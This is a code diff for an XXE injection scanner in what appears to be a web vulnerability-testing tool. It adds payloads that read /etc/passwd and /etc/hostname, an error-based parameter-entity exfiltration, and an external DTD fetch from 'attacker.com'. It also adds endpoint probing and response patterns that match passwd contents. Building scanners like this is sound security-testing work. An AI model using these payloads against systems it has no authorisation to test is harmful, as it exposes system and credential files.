@@ -2,7 +2,7 @@ import logging
 import re
 import textwrap
 from urllib.parse import urljoin
-from typing import Dict
+from typing import Dict, List, Optional
 from core.base_scanner import BaseScanner
 from core.utils import RequestUtils
 
@@ -10,51 +10,167 @@ class XXEInjectionScanner(BaseScanner):
     def __init__(self, target_url: str, config: Dict):
         super().__init__(target_url, config)
         self.payloads = [
-            textwrap.dedent("""\
-                <?xml version="1.0" encoding="ISO-8859-1"?>
-                <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-                <foo>&xxe;</foo>"""),
-            textwrap.dedent("""\
-                <?xml version="1.0" encoding="UTF-8"?>
-                <!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
-                <data>&xxe;</data>""")
+            """<?xml version="1.0" encoding="ISO-8859-1"?>
+               <!DOCTYPE foo [ <!ELEMENT foo ANY >
+               <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+               <foo>&xxe;</foo>""",
+            
+            """<?xml version="1.0" encoding="ISO-8859-1"?>
+               <!DOCTYPE data [
+               <!ENTITY file SYSTEM "file:///etc/hostname">
+               ]>
+               <data>&file;</data>""",
+            
+            """<?xml version="1.0" encoding="ISO-8859-1"?>
+               <!DOCTYPE data [
+               <!ENTITY % file SYSTEM "file:///etc/passwd">
+               <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+               %eval;
+               %error;
+               ]>
+               <data>test</data>""",
+            
+            """<?xml version="1.0" encoding="UTF-8"?>
+               <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe; ]>
+               <test>test</test>"""
         ]
 
     def scan(self) -> Dict:
-        results = []
-        response = self.make_request(self.target_url)
-        if not response:
-            return {'xxe_injection': []}
-        
-        forms = RequestUtils.extract_forms(response.text)
-        for form in forms:
-            form_url = urljoin(self.target_url, form['action'] or self.target_url)
-            for input_field in form['inputs']:
-     
-                if input_field['type'].lower() == 'textarea' or 'xml' in input_field['name'].lower():
-                    for payload in self.payloads:
-                        if self.test_xxe(form_url, form['method'], input_field['name'], payload):
-                            results.append({
-                                'url': form_url,
-                                'method': form['method'],
-                                'parameter': input_field['name'],
-                                'payload': payload,
-                                'vulnerability': 'XML External Entity (XXE) Injection',
-                                'severity': 'High'
-                            })
-                            
-        for payload in self.payloads:
-            if self.test_xxe(self.target_url, 'post', None, payload, direct=True):
-                results.append({
-                    'url': self.target_url,
+        try:
+            tasks = []
+            response = self.make_request(self.target_url)
+            
+            if not response:
+                return {'xxe_injection': []}
+
+            # Find XML endpoints and forms
+            forms = RequestUtils.extract_forms(response.text)
+            for form in forms:
+                if self.is_xml_endpoint(form):
+                    form_url = urljoin(self.target_url, form['action'] or self.target_url)
+                    tasks.append({
+                        'type': 'form',
+                        'url': form_url,
+                        'method': form['method'],
+                        'content_type': 'application/xml'
+                    })
+
+            # Test common XML endpoints
+            common_endpoints = ['/upload', '/import', '/api/data', '/xml', '/soap']
+            for endpoint in common_endpoints:
+                endpoint_url = urljoin(self.target_url, endpoint)
+                tasks.append({
+                    'type': 'endpoint',
+                    'url': endpoint_url,
                     'method': 'POST',
-                    'parameter': 'raw body',
-                    'payload': payload,
-                    'vulnerability': 'XML External Entity (XXE) Injection',
-                    'severity': 'High'
+                    'content_type': 'application/xml'
                 })
 
-        return {'xxe_injection': results}
+            results = self.run_concurrent_tasks(tasks)
+            return {'xxe_injection': results}
+
+        except Exception as e:
+            logging.error(f"XXE Injection scanner error: {e}")
+            return {'xxe_injection': [], 'error': str(e)}
+
+    def execute_task(self, task: Dict) -> Optional[Dict]:
+        """Implement the required execute_task method"""
+        try:
+            for payload in self.payloads:
+                result = self.test_xxe_injection(
+                    task['url'],
+                    task['method'],
+                    payload,
+                    task['content_type']
+                )
+                if result:
+                    return {
+                        'url': task['url'],
+                        'method': task['method'],
+                        'payload': payload,
+                        'type': 'XXE Injection',
+                        'severity': 'High',
+                        'evidence': result
+                    }
+            return None
+
+        except Exception as e:
+            logging.error(f"Error in XXE injection task: {e}")
+            return None
+
+    def test_xxe_injection(self, url: str, method: str, payload: str, content_type: str) -> Optional[str]:
+        try:
+            headers = {'Content-Type': content_type}
+            response = self.make_request(
+                url,
+                method=method.upper(),
+                data=payload,
+                headers=headers
+            )
+
+            if not response:
+                return None
+
+            # Check for file content disclosure
+            sensitive_patterns = [
+                r'root:.*:0:0:',          # /etc/passwd content
+                r'HOST=.*',                # hostname content
+                r'<?xml.*version=',        # XML parsing error
+                r'<!DOCTYPE.*>',           # DOCTYPE reflection
+                r'SimpleXMLElement',       # PHP XML parser
+                r'javax.xml',              # Java XML parser
+                r'org.xml.sax',            # SAX parser
+                r'XML parsing error',      # Generic XML error
+                r'Warning: simplexml_load'  # PHP warning
+            ]
+
+            for pattern in sensitive_patterns:
+                if re.search(pattern, response.text):
+                    return f"XXE pattern detected: {pattern}"
+
+            # Check for error messages
+            error_patterns = [
+                'java.io.FileNotFoundException',
+                'System.Xml',
+                'XML document structures must start and end within the same entity',
+                'XML parsing error',
+                'error on line'
+            ]
+
+            for error in error_patterns:
+                if error.lower() in response.text.lower():
+                    return f"XXE error detected: {error}"
+
+            return None
+
+        except Exception as e:
+            logging.error(f"Error testing XXE injection: {e}")
+            return None
+
+    def is_xml_endpoint(self, form: Dict) -> bool:
+        """Check if the form or endpoint likely accepts XML input"""
+        form_str = str(form).lower()
+        xml_indicators = [
+            'xml',
+            'import',
+            'upload',
+            'soap',
+            'data',
+            'feed',
+            'rss',
+            'atom'
+        ]
+        return any(indicator in form_str for indicator in xml_indicators)
+
+    def extract_url_parameters(self, url: str) -> List[str]:
+        try:
+            from urllib.parse import urlparse, parse_qs
+            parsed_url = urlparse(url)
+            params = parse_qs(parsed_url.query)
+            return list(params.keys())
+        except Exception as e:
+            logging.error(f"Error extracting URL parameters: {e}")
+            return []
 
     def test_xxe(self, url: str, method: str, param: str, payload: str, direct: bool = False) -> bool:
 
